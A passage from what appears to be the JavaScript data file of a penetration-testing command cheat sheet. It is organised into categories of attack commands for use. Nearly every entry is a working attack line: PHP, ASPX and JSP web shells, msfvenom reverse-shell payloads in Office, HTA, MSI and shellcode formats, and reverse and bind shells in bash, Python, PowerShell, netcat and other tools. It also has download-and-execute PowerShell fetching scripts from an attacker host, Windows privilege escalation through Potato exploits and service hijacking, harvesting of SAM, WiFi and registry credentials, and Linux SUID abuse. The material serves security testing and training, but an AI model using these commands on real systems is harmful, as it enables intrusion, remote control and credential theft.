          { title: "PHP Proc_Open Shell", desc: "PHP shell using proc_open()", cmd: "echo '<?php $p=proc_open($_GET[\"cmd\"],[1=>[\"pipe\",\"w\"]],$$ps);echo stream_get_contents($$ps[1]); ?>' > shell.php", tags: ["advanced"] },
          { title: "ASPX Web Shell", desc: "Minimal ASPX web shell", cmd: "echo '<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo{FileName=\"cmd.exe\",Arguments=\"/c \"+Request[\"cmd\"],UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd(); %>' > shell.aspx", tags: ["essential"] },
          { title: "JSP Web Shell", desc: "Minimal JSP web shell", cmd: "echo '<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>' > shell.jsp", tags: ["essential"] },
        ]
      },
      {
        name: "Office & Macro Payloads",
        commands: [
          { title: "VBA Macro Payload", desc: "Generate VBA macro for Office documents", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f vba -o macro.vba", tags: ["tool"] },
          { title: "HTA PowerShell Payload", desc: "Generate HTA file with PowerShell payload", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hta-psh -o shell.hta", tags: ["tool"] },
          { title: "MSI Installer Payload", desc: "Generate malicious MSI installer", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi", tags: ["tool"] },
        ]
      },
      {
        name: "Custom Shellcode",
        commands: [
          { title: "Raw Shellcode (Python)", desc: "Generate shellcode in Python format", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f python -o shellcode.py", tags: ["tool"] },
          { title: "Raw Shellcode (C)", desc: "Generate shellcode in C format", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -o shellcode.c", tags: ["tool"] },
          { title: "Raw Shellcode (C#)", desc: "Generate shellcode in C# format", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f csharp -o shellcode.cs", tags: ["tool"] },
          { title: "Raw Shellcode (Hex)", desc: "Generate shellcode as hex string", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f hex", tags: ["tool"] },
          { title: "Raw Shellcode (Raw)", desc: "Generate raw binary shellcode", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shellcode.bin", tags: ["tool"] },
          { title: "Encoded Payload (Shikata)", desc: "Encode payload with shikata_ga_nai encoder", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -i 5 -f exe -o encoded.exe", tags: ["advanced", "tool"] },
          { title: "Payload with Bad Chars Excluded", desc: "Generate payload avoiding null bytes and bad characters", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\\x00\\x0a\\x0d' -f exe -o clean.exe", tags: ["advanced", "tool"] },
          { title: "x86 Encoded Payload", desc: "Encode x86 payload with shikata_ga_nai", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -o encoded32.exe", tags: ["advanced", "tool"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 7. Shells, Listeners & Stabilization
  // ─────────────────────────────────────────────
  {
    id: "initial-foothold",
    name: "Shells, Listeners & Stabilization",
    icon: "🐚",
    description: "Establish reverse shells, bind shells, and web shells across platforms, then upgrade to fully interactive TTYs for stable exploitation.",
    subcategories: [
      {
        name: "Listener Setup",
        commands: [
          { title: "Netcat Listener", desc: "Start a basic netcat listener", cmd: "nc -lvnp <LPORT>", tags: ["essential"] },
          { title: "Rlwrap Netcat Listener", desc: "Netcat listener with readline (arrow keys)", cmd: "rlwrap nc -lvnp <LPORT>", tags: ["essential"] },
          { title: "Socat Listener", desc: "Start a socat listener", cmd: "socat TCP-LISTEN:<LPORT>,reuseaddr,fork -", tags: ["essential"] },
          { title: "Socat Encrypted Listener", desc: "Socat listener with SSL encryption", cmds: ["openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt", "cat shell.key shell.crt > shell.pem", "socat OPENSSL-LISTEN:<LPORT>,cert=shell.pem,verify=0,reuseaddr,fork -"], tags: ["advanced"] },
          { title: "Metasploit Multi/Handler", desc: "Start MSF multi/handler for staged payloads", cmds: ["msfconsole -q", "use exploit/multi/handler", "set PAYLOAD windows/x64/meterpreter/reverse_tcp", "set LHOST <LHOST>", "set LPORT <LPORT>", "run"], tags: ["essential", "tool"] },
          { title: "Metasploit Handler (One-Liner)", desc: "Quick MSF handler start from command line", cmd: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run'", tags: ["essential", "tool"] },
        ]
      },
      {
        name: "Linux Reverse Shells",
        commands: [
          { title: "Bash Reverse Shell", desc: "Bash TCP reverse shell", cmd: "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", tags: ["essential"] },
          { title: "Bash Reverse Shell (Alt)", desc: "Alternative bash reverse shell using file descriptors", cmd: "bash -c 'exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done'", tags: ["essential"] },
          { title: "Bash Reverse Shell (exec)", desc: "Bash reverse shell with exec redirection", cmd: "0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196", tags: ["advanced"] },
          { title: "Python3 Reverse Shell", desc: "Python3 one-liner reverse shell", cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", tags: ["essential"] },
          { title: "Python2 Reverse Shell", desc: "Python2 one-liner reverse shell", cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<LHOST>\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", tags: ["essential"] },
          { title: "PHP Reverse Shell", desc: "PHP one-liner reverse shell", cmd: "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", tags: ["essential"] },
          { title: "Perl Reverse Shell", desc: "Perl one-liner reverse shell", cmd: "perl -e 'use Socket;$i=\"<LHOST>\";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", tags: ["essential"] },
          { title: "Ruby Reverse Shell", desc: "Ruby one-liner reverse shell", cmd: "ruby -rsocket -e'f=TCPSocket.open(\"<LHOST>\",<LPORT>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", tags: ["essential"] },
          { title: "Netcat Reverse Shell (-e)", desc: "Netcat reverse shell with -e option", cmd: "nc -e /bin/sh <LHOST> <LPORT>", tags: ["essential"], note: "Only on netcat versions with -e flag (traditional)" },
          { title: "Netcat Reverse Shell (mkfifo)", desc: "Netcat reverse shell without -e flag", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f", tags: ["essential"] },
          { title: "Socat Reverse Shell", desc: "Socat reverse shell", cmd: "socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", tags: ["essential"] },
          { title: "Socat Encrypted Reverse Shell", desc: "Socat reverse shell over encrypted channel", cmd: "socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", tags: ["advanced"] },
          { title: "Lua Reverse Shell", desc: "Lua one-liner reverse shell", cmd: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<LHOST>','<LPORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');\"", tags: ["advanced"] },
          { title: "Awk Reverse Shell", desc: "AWK reverse shell one-liner", cmd: "awk 'BEGIN {s = \"/inet/tcp/0/<LHOST>/<LPORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null", tags: ["advanced"] },
        ]
      },
      {
        name: "Windows Reverse Shells",
        commands: [
          { title: "PowerShell Reverse Shell (One-Liner)", desc: "PowerShell TCP reverse shell one-liner", cmd: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", tags: ["essential"] },
          { title: "PowerShell Base64 Reverse Shell", desc: "Base64-encoded PowerShell reverse shell", cmds: ["echo -n '$client = New-Object System.Net.Sockets.TCPClient(\"<LHOST>\",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0", "powershell -nop -enc <BASE64_OUTPUT>"], tags: ["essential"] },
          { title: "PowerShell Download & Execute", desc: "Download and execute reverse shell script", cmd: "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')\"", tags: ["essential"] },
          { title: "Nishang Invoke-PowerShellTcp", desc: "Nishang reverse shell module", cmd: "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>\"", tags: ["tool"] },
          { title: "ConPtyShell (Full Interactive)", desc: "Fully interactive Windows reverse shell", cmds: ["# On attacker:", "stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>", "# On target (PowerShell):", "IEX(IWR http://<LHOST>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>"], tags: ["advanced", "tool"] },
          { title: "Windows Netcat Reverse Shell", desc: "Netcat reverse shell on Windows", cmd: "nc.exe -e cmd.exe <LHOST> <LPORT>", tags: ["essential"] },
        ]
      },
      {
        name: "Bind Shells",
        commands: [
          { title: "Netcat Bind Shell (Linux)", desc: "Start a bind shell listener on target", cmd: "nc -lvnp <PORT> -e /bin/bash", tags: ["essential"] },
          { title: "Netcat Bind Shell (mkfifo)", desc: "Bind shell without -e flag", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvnp <PORT> >/tmp/f", tags: ["essential"] },
          { title: "Socat Bind Shell", desc: "Socat bind shell with TTY", cmd: "socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", tags: ["essential"] },
          { title: "Python Bind Shell", desc: "Python bind shell", cmd: "python3 -c 'import socket,os,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",<PORT>));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", tags: ["essential"] },
          { title: "Connect to Bind Shell", desc: "Connect to an established bind shell", cmd: "nc -nv <TARGET_IP> <PORT>", tags: ["essential"] },
        ]
      },
      {
        name: "Web Shells",
        commands: [
          { title: "PHP System Shell", desc: "PHP web shell using system()", cmd: "<?php system($_GET['cmd']); ?>", tags: ["essential"] },
          { title: "PHP Passthru Shell", desc: "PHP web shell using passthru()", cmd: "<?php passthru($_REQUEST['cmd']); ?>", tags: ["essential"] },
          { title: "PHP Shell_Exec Shell", desc: "PHP web shell using shell_exec()", cmd: "<?php echo shell_exec($_GET['cmd']); ?>", tags: ["essential"] },
          { title: "PHP Exec Shell", desc: "PHP web shell using exec()", cmd: "<?php echo exec($_GET['cmd']); ?>", tags: ["essential"] },
          { title: "PHP Proc_Open Shell", desc: "PHP web shell using proc_open()", cmd: "<?php $d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=proc_open($_GET['cmd'],$d,$pipes);echo stream_get_contents($pipes[1]);?>", tags: ["advanced"] },
          { title: "Kali PHP Reverse Shell", desc: "Use the full-featured Kali PHP reverse shell", cmd: "cp /usr/share/webshells/php/php-reverse-shell.php shell.php && sed -i 's/127.0.0.1/<LHOST>/;s/1234/<LPORT>/' shell.php", tags: ["essential"], note: "Edit $ip and $port in the file before uploading" },
          { title: "Access Web Shell", desc: "Execute commands via uploaded web shell", cmd: "curl 'http://<TARGET_IP>/uploads/shell.php?cmd=id'", tags: ["essential"] },
        ]
      },
      {
        name: "Interactive Shell Upgrade",
        commands: [
          { title: "Python PTY Spawn", desc: "Spawn a PTY shell with Python", cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tags: ["essential"] },
          { title: "Python2 PTY Spawn", desc: "Spawn a PTY shell with Python2", cmd: "python -c 'import pty;pty.spawn(\"/bin/bash\")'", tags: ["essential"] },
          { title: "Script PTY Spawn", desc: "Spawn a PTY with script command", cmd: "script /dev/null -c bash", tags: ["essential"] },
          { title: "Full TTY Upgrade Process", desc: "Complete process to get a fully interactive shell", cmds: ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", "# Press Ctrl+Z to background the shell", "stty raw -echo; fg", "export TERM=xterm", "stty rows <ROWS> cols <COLS>"], tags: ["essential"], note: "Get your terminal size with: stty size" },
          { title: "Expect PTY Spawn", desc: "Spawn PTY via expect", cmd: "/usr/bin/expect -c 'spawn /bin/bash; interact'", tags: ["advanced"] },
          { title: "Socat TTY Upgrade", desc: "Upgrade shell to full TTY via socat", cmds: ["# On attacker: socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>", "# On target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>"], tags: ["advanced"] },
          { title: "Rlwrap for Windows Shells", desc: "Use rlwrap for arrow key support on Windows shells", cmd: "rlwrap nc -lvnp <LPORT>", tags: ["essential"], note: "Essential for Windows reverse shells which don't support arrow keys" },
          { title: "Export TERM Variable", desc: "Set TERM for proper terminal behavior", cmd: "export TERM=xterm-256color", tags: ["essential"] },
          { title: "Fix Shell PATH", desc: "Set PATH for full command availability", cmd: "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", tags: ["essential"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 8. Windows Privilege Escalation
  // ─────────────────────────────────────────────
  {
    id: "win-escalation",
    name: "Windows Privilege Escalation",
    icon: "⬆️",
    description: "Escalate privileges on Windows hosts through service misconfigurations, token abuse, credential harvesting, and kernel exploits.",
    subcategories: [
      {
        name: "System Reconnaissance",
        commands: [
          { title: "System Info", desc: "Get detailed system information", cmd: "systeminfo", tags: ["essential"] },
          { title: "Hostname", desc: "Get computer name", cmd: "hostname", tags: ["essential"] },
          { title: "Current User", desc: "Display current username", cmd: "whoami", tags: ["essential"] },
          { title: "User Privileges", desc: "List all privileges for current user", cmd: "whoami /priv", tags: ["essential"] },
          { title: "User Groups", desc: "List all group memberships", cmd: "whoami /all", tags: ["essential"] },
          { title: "List Local Users", desc: "Enumerate all local user accounts", cmd: "net user", tags: ["essential"] },
          { title: "User Details", desc: "Get details for a specific user", cmd: "net user <USER>", tags: ["essential"] },
          { title: "Local Administrators", desc: "List members of administrators group", cmd: "net localgroup administrators", tags: ["essential"] },
          { title: "Network Configuration", desc: "Display network adapter configuration", cmd: "ipconfig /all", tags: ["essential"] },
          { title: "Routing Table", desc: "Display routing table", cmd: "route print", tags: ["essential"] },
          { title: "Active Connections", desc: "Show active network connections", cmd: "netstat -ano", tags: ["essential"] },
          { title: "Running Processes", desc: "List all running processes", cmd: "tasklist /v", tags: ["essential"] },
          { title: "Installed Software (WMIC)", desc: "List installed software via WMIC", cmd: "wmic product get name,version,vendor", tags: ["essential"] },
          { title: "Installed Patches", desc: "List installed hotfixes", cmd: "wmic qfe list full", tags: ["essential"] },
          { title: "Scheduled Tasks", desc: "List all scheduled tasks", cmd: "schtasks /query /fo TABLE /nh", tags: ["essential"] },
          { title: "Firewall State", desc: "Check Windows Firewall status", cmd: "netsh advfirewall show allprofiles", tags: ["essential"] },
          { title: "Antivirus Status", desc: "Check installed antivirus (WMIC)", cmd: "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname,productstate", tags: ["essential"] },
          { title: "Drives List", desc: "List all drives on the system", cmd: "wmic logicaldisk get caption,description,freespace,size", tags: ["essential"] },
        ]
      },
      {
        name: "Service Misconfigurations",
        commands: [
          { title: "List All Services", desc: "Enumerate all Windows services", cmd: "sc query state= all", tags: ["essential"] },
          { title: "Service Details (SC)", desc: "Get configuration details for a service", cmd: "sc qc <SERVICE_NAME>", tags: ["essential"] },
          { title: "WMIC Service Paths", desc: "List service binary paths (find unquoted)", cmd: "wmic service get name,displayname,pathname,startmode", tags: ["essential"] },
          { title: "Find Unquoted Service Paths", desc: "Identify services with unquoted paths containing spaces", cmd: "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"", tags: ["essential"] },
          { title: "Check Service Permissions (accesschk)", desc: "Check which services current user can modify", cmd: "accesschk.exe /accepteula -uwcqv <USER> * /c", tags: ["essential", "tool"] },
          { title: "Check Service Binary Permissions", desc: "Check permissions on a service binary", cmd: "icacls \"C:\\path\\to\\service.exe\"", tags: ["essential"] },
          { title: "Modify Service Binary Path", desc: "Change service binary to payload (if writable)", cmd: "sc config <SERVICE_NAME> binpath= \"C:\\temp\\shell.exe\"", tags: ["essential"] },
          { title: "Restart Service", desc: "Stop and start a service", cmds: ["sc stop <SERVICE_NAME>", "sc start <SERVICE_NAME>"], tags: ["essential"] },
          { title: "DLL Hijacking Check", desc: "Use Procmon to find DLL hijack opportunities", cmd: "# Use Procmon filter: Result=NAME NOT FOUND, Path ends with .dll", tags: ["advanced"], note: "Place malicious DLL in writable path that service searches" },
        ]
      },
      {
        name: "Registry & Scheduled Tasks",
        commands: [
          { title: "AutoLogon Credentials", desc: "Check registry for auto-login credentials", cmd: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", tags: ["essential"] },
          { title: "Putty Saved Sessions", desc: "Check for stored Putty credentials", cmd: "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s", tags: ["essential"] },
          { title: "VNC Stored Passwords", desc: "Check for VNC stored passwords", cmd: "reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"", tags: ["advanced"] },
          { title: "Unattend.xml Files", desc: "Search for unattended install files with creds", cmd: "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*sysprep.inf 2>nul", tags: ["essential"] },
          { title: "Registry Run Keys", desc: "Check autorun registry keys", cmds: ["reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"], tags: ["essential"] },
          { title: "Scheduled Tasks Writable", desc: "Find writable scheduled task binaries", cmd: "schtasks /query /fo LIST /v | findstr /i \"Task To Run\"", tags: ["essential"] },
          { title: "Stored Credentials (cmdkey)", desc: "List cached credentials", cmd: "cmdkey /list", tags: ["essential"] },
          { title: "RunAs with Saved Creds", desc: "Execute as another user with stored credentials", cmd: "runas /savecred /user:<USER> \"C:\\temp\\shell.exe\"", tags: ["essential"] },
        ]
      },
      {
        name: "Token Abuse & Impersonation",
        commands: [
          { title: "Check SeImpersonatePrivilege", desc: "Check if current user has impersonation privilege", cmd: "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"", tags: ["essential"] },
          { title: "JuicyPotato", desc: "Exploit SeImpersonate with JuicyPotato", cmd: "JuicyPotato.exe -l <RANDOM_PORT> -p C:\\temp\\shell.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}", tags: ["essential", "tool"], note: "Works on Windows Server 2008-2016, Windows 7-10 (before certain patches)" },
          { title: "PrintSpoofer", desc: "Exploit SeImpersonate via print spooler", cmd: "PrintSpoofer.exe -c \"C:\\temp\\shell.exe\"", tags: ["essential", "tool"], note: "Works on Windows 10 and Server 2016/2019" },
          { title: "GodPotato", desc: "Exploit SeImpersonate with GodPotato", cmd: "GodPotato.exe -cmd \"C:\\temp\\shell.exe\"", tags: ["essential", "tool"], note: "Works on Windows Server 2012-2022, Windows 8-11" },
          { title: "SweetPotato", desc: "Exploit SeImpersonate with SweetPotato", cmd: "SweetPotato.exe -e EfsRpc -p C:\\temp\\shell.exe", tags: ["tool"] },
          { title: "RoguePotato", desc: "Exploit SeImpersonate with RoguePotato", cmd: "RoguePotato.exe -r <ATTACKER_IP> -e \"C:\\temp\\shell.exe\" -l <RANDOM_PORT>", tags: ["tool"] },
          { title: "Check SeBackupPrivilege", desc: "Check for backup privilege (read any file)", cmd: "whoami /priv | findstr /i \"SeBackup\"", tags: ["essential"] },
          { title: "Check SeRestorePrivilege", desc: "Check for restore privilege (write any file)", cmd: "whoami /priv | findstr /i \"SeRestore\"", tags: ["essential"] },
          { title: "Check SeDebugPrivilege", desc: "Check for debug privilege (access any process)", cmd: "whoami /priv | findstr /i \"SeDebug\"", tags: ["advanced"] },
        ]
      },
      {
        name: "Credential Harvesting",
        commands: [
          { title: "Search for Passwords in Files", desc: "Recursively search for password strings", cmd: "findstr /si password *.txt *.ini *.config *.xml *.php", tags: ["essential"] },
          { title: "PowerShell History", desc: "Read PowerShell command history", cmd: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", tags: ["essential"] },
          { title: "PowerShell History (PS)", desc: "Read PS history from PowerShell", cmd: "Get-Content (Get-PSReadLineOption).HistorySavePath", tags: ["essential"] },
          { title: "WiFi Passwords", desc: "Extract saved WiFi passwords", cmds: ["netsh wlan show profiles", "netsh wlan show profile name=\"<WIFI_NAME>\" key=clear"], tags: ["essential"] },
          { title: "SAM & SYSTEM Backup Files", desc: "Check for accessible SAM/SYSTEM backup copies", cmds: ["dir C:\\Windows\\Repair\\SAM", "dir C:\\Windows\\Repair\\SYSTEM", "dir C:\\Windows\\System32\\config\\RegBack\\SAM", "dir C:\\Windows\\System32\\config\\RegBack\\SYSTEM"], tags: ["essential"] },
          { title: "Copy SAM with Shadow Copies", desc: "Extract SAM via volume shadow copies", cmds: ["wmic shadowcopy list brief", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\SAM", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\SYSTEM"], tags: ["advanced"] },
          { title: "IIS Web.config Credentials", desc: "Check IIS configuration for credentials", cmd: "type C:\\inetpub\\wwwroot\\web.config | findstr /i connectionString password", tags: ["essential"] },
          { title: "Search Registry for Passwords", desc: "Search registry for password entries", cmd: "reg query HKLM /f password /t REG_SZ /s", tags: ["essential"] },
        ]
      },
      {
        name: "AlwaysInstallElevated",
        commands: [
          { title: "Check AlwaysInstallElevated (HKCU)", desc: "Check if AlwaysInstallElevated is enabled for user", cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", tags: ["essential"] },
          { title: "Check AlwaysInstallElevated (HKLM)", desc: "Check if AlwaysInstallElevated is enabled system-wide", cmd: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", tags: ["essential"] },
          { title: "Exploit AlwaysInstallElevated", desc: "Install malicious MSI with SYSTEM privileges", cmds: ["msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi", "msiexec /quiet /qn /i shell.msi"], tags: ["essential"], note: "Both HKCU and HKLM keys must be set to 1" },
        ]
      },
      {
        name: "Kernel Exploits",
        commands: [
          { title: "Windows Exploit Suggester", desc: "Suggest exploits based on systeminfo output", cmd: "python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt", tags: ["essential", "tool"] },
          { title: "Watson (.NET)", desc: "Find missing KBs and suggest privilege escalation", cmd: "Watson.exe", tags: ["tool"] },
          { title: "Sherlock (PowerShell)", desc: "Find missing patches for known privesc", cmd: "Import-Module .\\Sherlock.ps1; Find-AllVulns", tags: ["tool"] },
          { title: "Check System Architecture", desc: "Determine 32/64-bit for exploit compatibility", cmd: "systeminfo | findstr /i \"System Type\"", tags: ["essential"] },
          { title: "Check OS Version", desc: "Get exact OS version and build", cmd: "systeminfo | findstr /i /B \"OS\"", tags: ["essential"] },
        ]
      },
      {
        name: "Automated Scanners",
        commands: [
          { title: "WinPEAS", desc: "Comprehensive Windows privilege escalation scanner", cmd: "winPEASx64.exe", tags: ["essential", "tool"] },
          { title: "WinPEAS (Quiet Mode)", desc: "WinPEAS with reduced output", cmd: "winPEASx64.exe quiet systeminfo userinfo", tags: ["tool"] },
          { title: "PowerUp (PowerShell)", desc: "PowerShell privilege escalation scanner", cmds: ["Import-Module .\\PowerUp.ps1", "Invoke-AllChecks"], tags: ["essential", "tool"] },
          { title: "Seatbelt", desc: "Security-focused host survey tool", cmd: "Seatbelt.exe -group=all", tags: ["tool"] },
          { title: "SharpUp", desc: "C# port of PowerUp privesc checks", cmd: "SharpUp.exe audit", tags: ["tool"] },
          { title: "PrivescCheck", desc: "PowerShell privilege escalation enumeration", cmds: ["Import-Module .\\PrivescCheck.ps1", "Invoke-PrivescCheck -Extended"], tags: ["tool"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 9. Linux Privilege Escalation
  // ─────────────────────────────────────────────
  {
    id: "linux-escalation",
    name: "Linux Privilege Escalation",
    icon: "🐧",
    description: "Escalate privileges on Linux systems through SUID binaries, sudo misconfigurations, capabilities, cron exploitation, kernel exploits, and container escapes.",
    subcategories: [
      {
        name: "System Reconnaissance",
        commands: [
          { title: "Current User & ID", desc: "Show current user and group memberships", cmd: "id", tags: ["essential"] },
          { title: "Kernel Version", desc: "Display kernel version and architecture", cmd: "uname -a", tags: ["essential"] },
          { title: "OS Release Info", desc: "Show operating system release details", cmd: "cat /etc/os-release", tags: ["essential"] },
          { title: "Proc Version", desc: "Show kernel version from proc", cmd: "cat /proc/version", tags: ["essential"] },
          { title: "Environment Variables", desc: "List all environment variables", cmd: "env", tags: ["essential"] },
          { title: "Network Interfaces", desc: "Show network interfaces", cmd: "ip a", tags: ["essential"] },
          { title: "Active Connections", desc: "Show listening ports and connections", cmd: "ss -tulnp", tags: ["essential"] },
          { title: "Running Processes", desc: "Show all running processes", cmd: "ps auxf", tags: ["essential"] },
          { title: "Installed Packages (Debian)", desc: "List installed packages", cmd: "dpkg -l", tags: ["essential"] },
          { title: "Installed Packages (RHEL)", desc: "List installed packages", cmd: "rpm -qa", tags: ["essential"] },
          { title: "All Users", desc: "List all users from passwd file", cmd: "cat /etc/passwd", tags: ["essential"] },
          { title: "Readable Shadow", desc: "Check if shadow file is readable", cmd: "cat /etc/shadow 2>/dev/null", tags: ["essential"] },
          { title: "Home Directories", desc: "List home directories and their contents", cmd: "ls -la /home/", tags: ["essential"] },
          { title: "SSH Keys", desc: "Search for SSH private keys", cmd: "find / -name id_rsa -o -name id_ecdsa -o -name id_ed25519 2>/dev/null", tags: ["essential"] },
          { title: "Bash History", desc: "Read bash history for all accessible users", cmd: "cat ~/.bash_history 2>/dev/null; find /home -name .bash_history -exec cat {} \\; 2>/dev/null", tags: ["essential"] },
        ]
      },
      {
        name: "SUID & SGID Abuse",
        commands: [
          { title: "Find SUID Binaries", desc: "Find all SUID binaries on the system", cmd: "find / -perm -4000 -type f 2>/dev/null", tags: ["essential"] },
          { title: "Find SGID Binaries", desc: "Find all SGID binaries on the system", cmd: "find / -perm -2000 -type f 2>/dev/null", tags: ["essential"] },
          { title: "Find SUID+SGID", desc: "Find all SUID and SGID binaries", cmd: "find / -perm -u=s -o -perm -g=s -type f 2>/dev/null", tags: ["essential"] },
          { title: "SUID bash -p", desc: "If bash has SUID, spawn root shell", cmd: "bash -p", tags: ["essential"], note: "GTFOBins: bash" },
          { title: "SUID find Exec", desc: "Escalate via SUID find binary", cmd: "find . -exec /bin/sh -p \\; -quit", tags: ["essential"], note: "GTFOBins: find" },
